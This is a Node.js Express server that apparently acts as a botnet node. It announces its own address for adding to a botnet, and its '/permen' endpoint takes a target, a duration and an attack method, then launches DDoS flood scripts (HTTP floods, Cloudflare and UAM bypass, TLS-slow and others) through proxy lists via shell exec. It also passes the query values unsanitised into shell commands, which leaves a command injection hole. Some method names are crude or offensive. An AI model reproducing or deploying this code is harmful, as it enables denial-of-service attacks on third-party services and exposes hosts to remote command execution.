const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 1201;
const scrapeProxies = require('./proxy.js');

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

app.get('/permen', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  // Eksekusi sesuai methods
  if (methods === 'ninja') {
    console.log('received');
    exec(`node ./methods/ninja ${target} ${time}`);
  } else if (methods === 'panel') {
    console.log('received');
    exec(`node ./methods/panel.js ${target} ${time}`);
  } else if (methods === 'pluto') {
    exec(`node methods/Pluto.js ${target} ${time} 50 4 proxy.txt`);
  } else if (methods === 'poseidon') {
    exec(`node methods/Poseidon.js ${target} ${time} 4 proxy.txt autorate`);
  } else if (methods === 'nuke') {
    exec(`node methods/Nuke.js ${target} ${time} 50 4 proxy.txt`);
  } else if (methods === 'pidoras') {
    exec(`node methods/PIDORAS.js ${target} ${time} 50 4 proxy.txt`);
  } else if (methods === 'glory') {
    exec(`node methods/Glory.js ${target} ${time} 50 4 proxy.txt`);
  } else if (methods === 'gojo') {
    exec(`node methods/gojov5.js ${target} ${time} 50 4 proxy.txt`);
  } else if (methods === 'flood') {
    exec(`node methods/hybrid.js ${target} ${time} 4 50 proxy.txt`);
  } else if (methods === 'http-raw') {
    exec(`node methods/HTTP-RAW.js ${target} ${time}`);
  } else if (methods === 'raw') {
    exec(`node methods/raw.js ${target} ${time}`);
  } else if (methods === 'pepek') {
    exec(`node methods/pepek.js ${target} ${time}`);
  } else if (methods === 'thunder') {
    exec(`node methods/thunder.js ${target} ${time} 50 4 proxy.txt`);
  } else if (methods === 'bypass') {
    exec(`node methods/bypass.js ${target} ${time} 50 4 proxy.txt`);
  } else if (methods === 'cf-flood') {
    exec(`node methods/cf-flood.js ${target} ${time}`);
  } else if (methods === 'http-vip') {
    exec(`node methods/HTTP-VIP.js ${target} ${time} 50 4 proxy.txt`);
  } else if (methods === 'uam') {
    exec(`node methods/uambypass.js ${target} ${time} 50 proxy.txt`);
  } else if (methods === 'rape') {
    exec(`node methods/rape.js GET ${time} 4 proxy.txt 50 ${target}`);
  } else if (methods === 'tornado') {
    exec(`node methods/TORNADOV2.js GET ${target} ${time} 4 50 proxy.txt`);
  } else if (methods === 'raw-mix') {
    exec(`node methods/RAW-MIX.js ${target} ${time}`);
  } else if (methods === 'drown') {
    exec(`node methods/drown.js ${target} ${time} 4 50`);
  } else if (methods === 'cookie') {
    exec(`node methods/cookie.js ${target} ${time} 4 50 proxy.txt`);
  } else if (methods === 'tls-slow') {
    exec(`node methods/YAT-TLS.js ${target} ${time} 50 4 proxy.txt`);
  } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  fetchData();
});
